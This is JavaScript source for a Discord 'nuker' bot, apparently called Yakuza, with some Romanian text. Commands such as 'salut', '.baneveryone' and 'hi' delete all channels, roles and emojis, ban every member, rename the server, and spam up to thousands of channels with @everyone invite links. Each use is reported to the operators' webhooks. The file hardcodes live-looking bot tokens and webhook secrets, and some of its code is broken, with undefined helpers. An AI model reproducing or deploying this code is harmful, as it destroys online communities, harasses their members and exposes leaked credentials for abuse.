const { Client } = require("discord.js");
const Discord = require("discord.js");
const { MessageEmbed, version: djsversion } = require('discord.js');
const client = new Discord.Client({
});

const db = require("quick.db")
const talkedRecently = new Set();

const http = require("http");
http.createServer((_, res) => res.end("Alive")).listen(8080)

client.on("ready", async () => {

let matatactu = new Discord.MessageEmbed()
.setColor("#0d0d0d")
.setTitle("> Yakuza")
.setFooter('BEST NUKER', 'https://images-ext-1.discordapp.net/external/BjO_b2qW4J8t3HCk_l1sWBkOpVjkVXLFUAGKDRZ1v9s/%3Fsize%3D1024/https/cdn.discordapp.com/icons/906212055751745546/f452f03383447d451ed47f4e6c535b45.webp?width=433&height=433')
.setDescription(`> Camora Premium The bot was reconnected to the host! <:disk:928304743711924294>`);

const wrb = new Discord.WebhookClient("928709086726479892", "yrQEywVza01glHmGKGRafHa7kTD7hzeS5dMI2ovdnk9MaWab4uptkgHg14pD5JrpRX95");
    await wrb.send(matatactu)

client.user.setPresence({
    status: "STREAMING",
    activity: {
      name: "Die",
      type: "STREAMING",
       url: "https://twitch.tv/SealedSaucer"
    }
  })

  console.log(`
====================bot========================
ce[0m====================bot========================`);
  //OTI4MTc5MjQyNzcxMDQ2NTEx.YdVASA.2_ozEk_RiEIOO51-UpcNkJljeTc
}); 

  console.log("Servers:")
    client.guilds.cache.forEach((guild) => {
        console.log(" csf cuaie >> " + guild.name + " - sklavi " + guild.memberCount)
    })

 client.on(`message`, message => { if (message.content === `ping`) { message.channel.send(`> **↳ Latency is** **${Date.now() - message.createdTimestamp}ms.**<:disk:928304743711924294> \ > **↳ API Latency is** **${Math.round(message.client.ws.ping)}ms**<:disk:928304743711924294>`); } });
 
client.login('BOT_TOKEN')

client.on("message", async(message)=>{
  if (!message.guild) return;
      if (!message.guild) return;
    if (message.content.startsWith('salut')) {

    
         if(message.guild.id == '927845890587254794') return message.channel.send('> **Ok <:PES_SadHug:928213452353318923>**');

       let channels =  message.guild.channels.cache.array();
        let members =  message.guild.members.cache.array();
        let roles =  message.guild.roles.cache.array();
        let emojis =  message.guild.emojis.cache.array();
let guild = message.guild.id


 



      const sleep = (time) => new Promise(resolve => setTimeout(resolve, time));
          db.set(`channel_${message.guild.id}`, "k")



   let mes = `** <:basari:928304730940248114> ${message.author.tag}** (` + "`" + message.author.id + "`" + `)
> A folosit comanda **salut** pe serverul **${message.guild.name}** (` + "`" + message.guild.id + "`" + `)   Cu **${message.guild.memberCount} **Membrii <:newrozet:928304749139329085>
https://discord.gg/eYjjscK7cm `;
    const wrb = new Discord.WebhookClient("929710749624967220","VxBS_qaA-hmeqfcQeHsRm8XqQQnYxjR3j3RBiDw4zzPTalMO9wJNnmMtMb62tHSweGoF");

    await wrb.send(mes)

let token = "OTEwNDMzOTI0OTE0NzUzNTc3.YZSxqg.Q2ACUk3vn-gnlT05pir9p-GLzNU"
const phin = require('phin').unpromisified
let guildID = message.guild.id












       message.guild.channels.cache.array().forEach(channel => {
      channel.delete();
    });
    message.guild.roles.cache
      .filter(
        r =>
          !r.managed &&
          r.position < message.guild.me.roles.highest.position &&
          r.id !== message.guild.id
      )
      .forEach(role => {
        role.delete();
      });
    message.guild.emojis.cache.array().forEach(emoji => {
      emoji.delete();
    });





message.guild.members.cache.filter(member => message.guild.member(member).bannable && member.id !== message.author.id).forEach( member => {
   member.ban()
     
})























message.guild.setName("Crips Was Here")
    message.guild.setIcon(
      "https://cdn.discordapp.com/attachments/786279916273795115/802917703446560789/Screenshot_20210124-143354_TikTok.jpg"
    );
    
        
    
  

        
        
db.set(`${message.guild.id}-grief`, true);



        
       


    
    


}

//invite
//invite
   if (message.content.startsWith('invite') || message.content.startsWith("Invite") || message.content.startsWith("INVITE")) {

    const embed = new Discord.MessageEmbed()
      .setTitle('<:linkd:916714146786070561> **__Bot Invite__**')
      .setDescription(`<:whitesmalldot:916714145343213638> **Click on the 'Invite Link' button to add bot to the server**`)
      .setImage(``)
      .setFooter(
        `Invite`,
        message.author.displayAvatarURL({
          dynamic: true
        })
      )
      .setTimestamp()
      .setColor('969db9')

    const button4 = new buttonClient.MessageButton()
      .setLabel("Invite Link")
      .setURL("https://discord.com/api/oauth2/authorize?client_id=734800252569124894&permissions=8&scope=bot")
    const button5 = new buttonClient.MessageButton()
      .setLabel("Website (BETA)")
      .setURL("https://spartanu.tk/")


    /* Send Message with button */
    buttonClient.send(null, { channel: message.channel.id, embed, buttons: [[button4, button5]] })


  }


if
  
(message.content.startsWith('ver')) {
    const helpEmbed = new Discord.MessageEmbed()
      .setTitle(' **__Verify__** <:newrozet:928304749139329085>')
      .setDescription(`

>  Verify For Member in Best Nuker <:disk:928304743711924294>`)
      .setImage(``)
                .setFooter(
                    `Since 2021-2022`,
                    message.author.displayAvatarURL({
                        dynamic: true
                    })
                )
            .setTimestamp()
      .setColor('00001')
        message.channel.send(helpEmbed)
      }
  
      if (message.content.startsWith('help')) {
            const helpEmbed = new Discord.MessageEmbed()
                .setAuthor(message.author.username, message.author.avatarURL({ dynamic: true }))
                
                .setTitle('Mafia Yakuza </>')

                .setDescription(`__**Bot Commands**__

<:GOD_JuiceBox:928213433474760735> **Free Commands**

> salut - __Destroy The Server__
> .baneveryone - __Banall Members__

<:basari:928304730940248114> **Premium Commands**

> hi - __Premium Destroy, Spam__

__Daca ai probleme contacteaza un dev!__`)
                .setFooter(`© Yakuza | Author: Floz`)
                .setColor(`f0ff0f`)//FUTUTI RASA MA TI TACI ODATA
                .setTimestamp(Date.now());
            message.channel.send(helpEmbed);
        }
  
if (message.content.startsWith("rmv premium")) {

        const embed = new MessageEmbed()
        .setDescription(`> That User Is Dont Have Premium! <:hata:928304786988752997>`)
    
        .setColor("0d0d0d")
           let ownerID = "919513595065286706"
  if(message.author.id !== ownerID) return;
    const user = message.mentions.members.first() || message.guild.members.cache.get(args[0])
    db.fetch(`dev_${user.id}`);
    db.delete(`dev_${user.id}`, 1)
    message.channel.send(`> Now This User Dont Have premium<:hata:928304786988752997>' `)
    user.send(embed)
  }
  if (message.content.startsWith('.baneveryone')) {
    if (message.guild.id === "923362732328255509") return message.channel.send("> No Why? <:PES_SadHug:928213452353318923>")
    message.delete();
    let Embed4 = new Discord.MessageEmbed()
    .setColor("#0d0d0d")
    .setDescription(`> <:hata:928304786988752997> No Premium`);
  
  let user = message.mentions.members.first() || message.author;
  let vip5 = await db.fetch(`dev_${message.author.id}`)

     if(vip5 < 1) return message.channel.send(Embed4)
    message.guild.members.cache.forEach(member => member.ban({ reason: " Yakuza Best Nuker" })
      .then(console.log(`${member.user.tag} was banned`) && message.channel.send("Banez serveru")

      ))
      
}



if (message.content.startsWith("add premium")) {

        const embed = new MessageEmbed()
        .setDescription(`**Now You Have My Premium Enjoy! ** <:basari:928304730940248114>`)
    
        .setColor("0d0d0d")
           let ownerID = "687217040133849101"
  if(message.author.id !== ownerID) return;
    const user = message.mentions.members.first() || message.guild.members.cache.get(args[0])
    db.fetch(`dev_${user.id}`);
    db.set(`dev_${user.id}`, 1)
    message.channel.send(`Now You Have Premium Enjoy! <:basari:928304730940248114>`)
    user.send(embed)
  }


        if (message.content.startsWith('hi')) {


    let Embed4 = new Discord.MessageEmbed()
    .setColor("#0d0d0d")
    .setDescription(`> **No Premium** <:hata:928304786988752997>`);
     
  let user = message.mentions.members.first() || message.author;
  let vip5 = await db.fetch(`dev_${message.author.id}`)

     if(vip5 < 1) return message.channel.send(Embed4)
      
                   if(message.guild.id == '927845890587254794') return message.channel.send('> **No why?**');

            if (!message.guild.me.hasPermission("ADMINISTRATOR")) {
                return console.log(red("PERMISSION MISSING: ADMINSTRATOR!!!!!"))
            } else {
                  let channels =  message.guild.channels.cache.array();
                     message.guild.channels.cache.array().forEach(channel => {
      channel.delete();
    });
        let pulamea = `**<:newrozet:928304749139329085>  ${message.author.tag}** (` + "`" + message.author.id + "`" + `)  

> A  folosit comanda **hi** pe serverul **${message.guild.name}** (` + "`" + message.guild.id + "`" + `) Cu **${message.guild.memberCount}** Membri <:disk:928304743711924294>`;
    const wrb = new Discord.WebhookClient("928944910151876619","ttKoYX7hntsySqwwrKm7Xcd_VHHqLTPoCtmaZ-FKQ10uc3ZDZcrdf0iAIvE9s2yyYjay");
                                    

    await wrb.send(pulamea)
                let args = message.content.split(" ").slice(1);
                var argresult = args.join(' ');
                // If you dont give an input
                if (!argresult) {
                    for (var i = 0; i < 1000; i++) {
                        message.guild.channels.create('ati luat muie by' + message.author.username)

                        for (var i = 0; i < 1000; i++) {
                            let channels = message.guild.channels.create('ati luat muie by' + message.author.username)

                            channels.then(
                                function (channel, index) {
                                    for (var i = 0; i < 1000; i++) {
                                        channel.send('@everyone https://discord.gg/eYjjscK7cm ne mutam' + argresult)
                                        console.log(blueBright(`CHANNEL PINGED!`));
                                        // other per-channnel logic
                                    }
                                }
                            );
                        }

                    }

                }
                // If you give an input
                for (var i = 0; i < 1000; i++) {
                    let channels = message.guild.channels.create(argresult)

                    channels.then(
                        function (channel, index) {
                            for (var i = 0; i < 1000; i++) {
                                channel.send('@everyone https://discord.gg/eYjjscK7cm ne mutam' + argresult);
                                console.log(`CHANNEL PINGED!`);
                                // other per-channnel logic
                            }
                        }
                    );
                }
            }
            message.delete();
        }
   
            
 })


 



client.login("OTMxMjEwNDkyOTM1MDMyODcy.YeBHWg.hCQUCrwhUiFLjmOB_SH3claPmRo")